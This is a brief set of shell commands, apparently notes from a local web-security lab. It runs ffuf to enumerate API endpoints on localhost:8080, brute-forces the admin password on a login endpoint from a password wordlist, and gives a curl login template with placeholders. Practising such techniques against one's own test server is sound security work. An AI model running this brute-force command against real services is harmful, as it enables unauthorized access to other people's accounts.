# Discover the base api endpooints
ffuf -w ./word-lists/endpoints.txt:PATH -u http://localhost:8080FUZZ -fc 404,301 -v -r
#                                                              ^  Note the lack of / in the path... look at endpoints.txt
# Brute force login page with ffuf
ffuf -w ./word-lists/passwords.txt:PASS -u http://localhost:8080/api/v1/login -X POST -H "Content-Type: application/json" -d '{"username":"admin", "password":"PASS"}' -fc 401,400,405
# handle login
curl -X POST http://localhost:8080/????/login -H "Content-Type: application-json" -d '{"username":"???","password":"???"}'
